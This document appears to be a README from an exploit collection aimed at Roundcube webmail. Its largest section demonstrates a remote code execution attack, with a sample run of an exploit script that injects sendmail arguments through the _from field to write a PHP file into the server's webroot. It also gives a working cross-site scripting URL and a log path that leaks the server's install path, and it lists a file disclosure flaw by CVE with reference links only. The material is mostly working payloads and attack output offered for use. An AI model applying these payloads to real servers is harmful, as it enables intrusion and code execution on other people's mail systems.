# Roundcube 1.2.2 - Remote Code Execution

Affected Versions: 1.0.0 - 1.2.2

## Requirements
- Roundcube must be configured to use PHP's mail() function (by default)
- PHP's mail() function is configured to use sendmail (by default)
- PHP is configured to have safe_mode turned off (by default)
- An attacker must know or guess the absolute path of the webroot

## Sample
	starnight:roundcube starnight$ python3 roundcube_rce.py
	*********************************************
		Exploiting Roundcube RCE needs
	* valid user/passwd
	* need to know remote roundcube path
	*********************************************
	please input roundcube mail url : http://mail.roundcube.com/roundcubemail
	base_url : http://mail.roundcube.com/roundcubemail
	url_login : http://mail.roundcube.com/roundcubemail/?_task=login
	url_compose : http://mail.roundcube.com/roundcubemail/?_task=mail&_mbox=INBOX&_action=compose

	step 1 : http://mail.roundcube.com/roundcubemail
	csrf_token : aa3d941dbe6a11620ed34ceca86ff02a

	step 2 : http://mail.roundcube.com/roundcubemail/?_task=login
	please input username : user1
	please input password : 123456
	please input webmail path(eg./var/www/html/roundcubemail) : /var/www/html/roundcubemail
	csrf_token : bdfb5b8d5d827d9d923d203f14b3bea7

	step 3 : http://mail.roundcube.com/roundcubemail/?_task=mail&_mbox=INBOX&_action=compose
	compose_id : 5963802445acdc8afa1484
	http://mail.roundcube.com/roundcubemail?_task=mail&_action=compose&_id=5963802445acdc8afa1484
	csrf_token : bdfb5b8d5d827d9d923d203f14b3bea7

	step 4 : http://mail.roundcube.com/roundcubemail/?_task=mail&_unlock=loading1523435696&_lang=en&_framed=1
	_from : example@example.com -OQueueDirectory=/tmp -X/var/www/html/roundcubemail/logs/rce.php
	200
	step 5 : refer http://mail.roundcube.com/roundcubemail/logs/rce.php

![image](https://github.com/starnightcyber/Exploit-Database-For-Webmail/blob/master/roundcube/pics/roundcube_rce.png)

# Roundcube Webmail File Disclosure Vulnerability

------------
CVE : CVE-2017-16651

Affected Versions: 1.1.0 - 1.1.9, 1.2.0 - 1.2.6, 1.3.0 - 1.3.2

## Requirements
- email account : username / password

## References 
    https://github.com/roundcube/roundcubemail/issues/6026
    https://nvd.nist.gov/vuln/detail/CVE-2017-16651

	See more:(better check with burpsuite and firefox)
	    http://www.cnblogs.com/Hi-blog/p/8760413.html


# Roundcube Webmail Cross-site scripting
CVE : CVE-2015-5381

Affected Versions: 1.1.x < 1.1.2

## Requirements
- email account : username / password

## References
    https://github.com/roundcube/roundcubemail/issues/4837
    http://www.cnblogs.com/Hi-blog/p/8776374.html

## Exploit
(better check with burpsuite and firefox)

    check url http://your-roundcubemail/?_task=mail&_mbox=INBOX"><script>alert("Roundcube+v1.1.1+XSS")<%2Fscript>
    login with valid username and password



# Roundcube Webmail information leakage
------------
CVE : CVE-2015-5383

Affected Versions: 1.1.x < 1.1.2(1.1.3,1.1.5亲测都有效)

Requirements
------------
- None


## References
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5383
    https://github.com/roundcube/roundcubemail/issues/4816

## Exploit
    check url http://mail.roundcube.com/roundcubemail/logs/errors
    the root path of roundcube webmail will be disclosed
    
## Sample

	[14-Aug-2017 20:54:51 +0800]: <frgerloc> IMAP Error: Login failed for user1 from 192.168.1.102. AUTHENTICATE PLAIN: Authentication failed. in /var/www/html/roundcubemail/program/lib/Roundcube/rcube_imap.php on line 198 (POST /roundcubemail/?_task=login?_task=login&_action=login)